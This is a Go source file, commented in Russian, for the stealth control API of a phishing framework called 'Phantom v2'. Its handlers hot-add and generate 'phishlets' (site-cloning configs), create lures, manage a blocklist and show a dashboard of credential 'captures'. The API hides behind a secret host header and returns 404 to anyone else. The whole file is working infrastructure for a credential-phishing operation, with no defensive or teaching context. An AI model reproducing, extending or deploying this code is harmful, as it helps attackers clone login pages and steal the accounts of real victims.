// Package api — stealth API (Pro-паритет, v1).
// Pro: тот же 443 + секретный hostname + mTLS client cert.
// v1 lab: отдельный :8080 + обязательный X-Stealth-Host == stealth_hostname.
// mTLS включается автоматически если ca_file существует.
package api

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/phantom-v2/phantom/core"
	"github.com/phantom-v2/phantom/internal/metrics"
	"github.com/phantom-v2/phantom/internal/webui"
)

type Deps struct {
	StealthHost string
	CAFile      string
	Store       core.PhishletStore
	Blocked     core.Blocklist
	Lures       core.LureStore
	StartedAt   time.Time
	Token       string // PHANTOM_API_TOKEN: если задан — обязательный Bearer
	Limit       Limiter
	OnSmart     func(in SmartLureIn) // персист smart-lure (main wires sqlite)
	NodeID      string               // node_id в stats (мульти-нода)
	PhishDir    string               // dir для reload/persist YAML (hot-reload)
	OnReload    func() error         // Reload стора (main wires store.Reload)
	OnUpsert    func(yaml []byte) (string, error)
	OnGenerate  func(origin, domain, id, sub, html string) (string, error)
}

// Limiter — rate-limit для API.
type Limiter interface{ Allow(ip string) bool }

func Handler(d Deps) http.Handler {
	mux := http.NewServeMux()
	guard := func(next http.HandlerFunc) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path != "/health" && r.Header.Get("X-Stealth-Host") != d.StealthHost {
				http.Error(w, "not found", http.StatusNotFound)
				return
			}
			if d.Limit != nil && !d.Limit.Allow(clientIP(r)) {
				http.Error(w, "rate limited", http.StatusTooManyRequests)
				return
			}
			if d.Token != "" && r.URL.Path != "/health" {
				if r.Header.Get("Authorization") != "Bearer "+d.Token {
					http.Error(w, "unauthorized", http.StatusUnauthorized)
					return
				}
			}
			next(w, r)
		}
	}
	mux.HandleFunc("/health", func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte("ok"))
	})
	// /ui — статика без stealth-хедера (браузерная навигация его не ставит),
	// но только с loopback или stealth-Host, иначе 404.
	ui := webui.Handler()
	mux.HandleFunc("/ui/", func(w http.ResponseWriter, r *http.Request) {
		if hostOnly(r.Host) != d.StealthHost && !isLoopback(r.RemoteAddr) {
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
		http.StripPrefix("/ui", ui).ServeHTTP(w, r)
	})
	mux.HandleFunc("/api/v1/stats", guard(func(w http.ResponseWriter, _ *http.Request) {
		_ = json.NewEncoder(w).Encode(map[string]any{
			"node":      d.NodeID,
			"phishlets": d.Store.Count(),
			"uptime_s":  int(time.Since(d.StartedAt).Seconds()),
		})
	}))
	mux.HandleFunc("/api/v1/phishlets", guard(func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			ids := []string{}
			for _, p := range d.Store.All() {
				ids = append(ids, p.ID)
			}
			_ = json.NewEncoder(w).Encode(ids)
		case http.MethodPost:
			// Hot-add YAML без рестарта.
			body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
			if err != nil || len(body) == 0 {
				http.Error(w, "bad yaml", http.StatusBadRequest)
				return
			}
			if d.OnUpsert == nil {
				http.Error(w, "upsert disabled", http.StatusNotImplemented)
				return
			}
			id, err := d.OnUpsert(body)
			if err != nil {
				http.Error(w, err.Error(), http.StatusBadRequest)
				return
			}
			w.WriteHeader(http.StatusCreated)
			_, _ = w.Write([]byte(id))
		default:
			http.Error(w, "method", http.StatusMethodNotAllowed)
		}
	}))
	mux.HandleFunc("/api/v1/phishlets/reload", guard(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method", http.StatusMethodNotAllowed)
			return
		}
		if d.OnReload == nil {
			http.Error(w, "reload disabled", http.StatusNotImplemented)
			return
		}
		if err := d.OnReload(); err != nil {
			http.Error(w, err.Error(), http.StatusUnprocessableEntity)
			return
		}
		w.WriteHeader(http.StatusNoContent)
	}))
	mux.HandleFunc("/api/v1/phishlets/generate", guard(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method", http.StatusMethodNotAllowed)
			return
		}
		if d.OnGenerate == nil {
			http.Error(w, "generate disabled", http.StatusNotImplemented)
			return
		}
		var in struct {
			Origin, Domain, ID, Sub, HTML string
		}
		if err := json.NewDecoder(io.LimitReader(r.Body, 1<<20)).Decode(&in); err != nil || in.Origin == "" || in.Domain == "" || in.ID == "" {
			http.Error(w, "need origin, domain, id", http.StatusBadRequest)
			return
		}
		yml, err := d.OnGenerate(in.Origin, in.Domain, in.ID, in.Sub, in.HTML)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		w.Header().Set("Content-Type", "text/yaml")
		_, _ = w.Write([]byte(yml))
	}))
	mux.HandleFunc("/api/v1/block", guard(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method", http.StatusMethodNotAllowed)
			return
		}
		var in struct {
			Key, Reason string
		}
		if err := json.NewDecoder(r.Body).Decode(&in); err != nil || in.Key == "" {
			http.Error(w, "bad json", http.StatusBadRequest)
			return
		}
		d.Blocked.Block(in.Key, in.Reason)
		w.WriteHeader(http.StatusNoContent)
	}))
	mux.HandleFunc("/api/v1/lures", guard(func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case http.MethodGet:
			_ = json.NewEncoder(w).Encode(d.Lures)
		case http.MethodPost:
			var in SmartLureIn
			if err := json.NewDecoder(r.Body).Decode(&in); err != nil || in.Path == "" || in.PhishletID == "" {
				http.Error(w, "bad json", http.StatusBadRequest)
				return
			}
			if err := CreateSmartLure(d.Lures, in); err != nil {
				http.Error(w, err.Error(), http.StatusBadRequest)
				return
			}
			if d.OnSmart != nil {
				d.OnSmart(in)
			}
			w.WriteHeader(http.StatusCreated)
		default:
			http.Error(w, "method", http.StatusMethodNotAllowed)
		}
	}))
	mux.HandleFunc("/dashboard", guard(func(w http.ResponseWriter, _ *http.Request) {
		req, blk, cap := metrics.Snapshot()
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		fmt.Fprintf(w, `<!doctype html><html><head><meta charset="utf-8"><title>Phantom</title></head><body>
<h1>Phantom v2</h1><p>phishlets=%d uptime=%ds</p><p>requests=%d blocked=%d captures=%d</p><ul>`,
			d.Store.Count(), int(time.Since(d.StartedAt).Seconds()), req, blk, cap)
		for _, p := range d.Store.All() {
			fmt.Fprintf(w, "<li>%s domains=%d</li>", p.ID, len(p.BaseDomains))
		}
		_, _ = w.Write([]byte(`</ul></body></html>`))
	}))
	return mux
}

// MTLSConfig возвращает nil если ca_file отсутствует (lab http).
func MTLSConfig(caFile string) (*tls.Config, error) {
	if caFile == "" {
		return nil, nil
	}
	b, err := os.ReadFile(caFile)
	if err != nil {
		return nil, nil // lab: файла нет — работаем без mTLS
	}
	pool := x509.NewCertPool()
	pool.AppendCertsFromPEM(b)
	return &tls.Config{ClientCAs: pool, ClientAuth: tls.VerifyClientCertIfGiven}, nil
}

func clientIP(r *http.Request) string {
	if h := r.Header.Get("X-Forwarded-For"); h != "" {
		return h
	}
	return r.RemoteAddr
}

func hostOnly(h string) string {
	if host, _, err := net.SplitHostPort(h); err == nil {
		return host
	}
	return strings.Trim(h, "[]")
}

func isLoopback(remote string) bool {
	host := hostOnly(remote)
	if host == "127.0.0.1" || host == "::1" {
		return true
	}
	if ip := net.ParseIP(host); ip != nil {
		return ip.IsLoopback()
	}
	return false
}
